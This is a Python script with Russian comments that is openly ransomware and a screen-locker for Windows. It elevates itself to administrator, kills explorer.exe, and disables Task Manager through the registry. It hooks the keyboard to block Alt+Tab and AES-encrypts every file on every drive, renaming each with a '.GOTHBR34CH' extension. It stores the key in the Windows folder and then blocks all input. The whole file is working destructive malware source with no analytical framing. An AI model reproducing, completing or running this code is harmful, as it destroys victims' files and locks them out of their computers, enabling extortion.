import os
import sys
import ctypes
import winreg
import win32con
import win32gui
import win32process
import threading
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Автоподнятие прав админа
def elevate():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, None, 1)
        sys.exit()

elevate()

# Блокировка интерфейса
def disable_system():
    # Панель задач
    os.system("taskkill /f /im explorer.exe")
    
    # Реестр: блокировка Alt+Tab
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System") as key:
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "NoTaskbarContextMenu", 0, winreg.REG_DWORD, 1)
    
    # Хук клавиатуры
    def block_keys():
        def hook_proc(nCode, wParam, lParam):
            if wParam == win32con.WM_KEYDOWN:
                if ctypes.windll.user32.GetAsyncKeyState(win32con.VK_TAB) & 0x8000:
                    if ctypes.windll.user32.GetAsyncKeyState(win32con.VK_MENU) & 0x8000:
                        return 1  # Блок Alt+Tab
            return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
        
        hook = ctypes.windll.user32.SetWindowsHookExA(13, hook_proc, None, win32process.GetCurrentThreadId())
        msg = ctypes.wintypes.MSG()
        while ctypes.windll.user32.GetMessageA(ctypes.byref(msg), None, 0, 0):
            pass

    threading.Thread(target=block_keys, daemon=True).start()

# Шифрование
def encrypt_system():
    key = get_random_bytes(32)
    drives = [f"{d}:\\" for d in "CDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:")]
    
    for drive in drives:
        for root, _, files in os.walk(drive):
            for file in files:
                try:
                    path = os.path.join(root, file)
                    iv = get_random_bytes(16)
                    cipher = AES.new(key, AES.MODE_CBC, iv)
                    
                    with open(path, 'rb+') as f:
                        data = f.read()
                        padded = data + b' ' * (16 - len(data) % 16)
                        f.seek(0)
                        f.write(iv + cipher.encrypt(padded))
                        os.rename(path, path + ".GOTHBR34CH")
                except: 
                    continue
    
    with open("C:\\WINDOWS\\key.bin", 'wb') as f:
        f.write(key)

# Запуск
disable_system()
encrypt_system()
ctypes.windll.user32.BlockInput(True)  # Блокировка ввода